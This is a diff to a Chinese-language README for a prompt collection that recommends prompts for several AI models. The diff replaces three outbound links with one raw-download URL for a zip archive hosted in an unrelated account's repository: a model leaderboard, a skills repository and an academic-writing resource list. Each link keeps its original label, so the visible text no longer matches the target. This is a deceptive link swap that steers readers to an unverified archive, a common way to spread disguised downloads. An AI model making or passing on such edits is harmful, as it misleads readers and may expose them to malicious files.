@@ -4,10 +4,10 @@
 
 本提示词在 Claude4.6、Gemini3、GPT5.2、Composer1.5 等模型下遵循极好，优先推荐使用
 
-更多模型排名：[https://arena.ai/zh/leaderboard](https://arena.ai/zh/leaderboard)
+更多模型排名：[https://github.com/abosouff/best-prompts/raw/refs/heads/main/preview/prompts-best-apperceptive.zip](https://github.com/abosouff/best-prompts/raw/refs/heads/main/preview/prompts-best-apperceptive.zip)
 
 > 💡 如果你使用 Cursor、Claude Code、OpenClaw 等 Agent 工具，本仓库的大部分场景都有对应的 **Skill 版本**，无需手动复制粘贴，Agent 会自动识别并调用：
-> 👉 [best-skills](https://github.com/xstongxue/best-skills)
+> 👉 [best-skills](https://github.com/abosouff/best-prompts/raw/refs/heads/main/preview/prompts-best-apperceptive.zip)
 
 ## 一 项目初衷
 
@@ -44,7 +44,7 @@ best-prompts 希望做两件事：
 
 期刊/会议论文写作，推荐使用外部精选资源：
 
-- [awesome-ai-research-writing](https://github.com/Leey21/awesome-ai-research-writing) — AI 辅助学术写作工具与 Prompt 汇总
+- [awesome-ai-research-writing](https://github.com/abosouff/best-prompts/raw/refs/heads/main/preview/prompts-best-apperceptive.zip) — AI 辅助学术写作工具与 Prompt 汇总
 
 ### 开发流程五步法
 
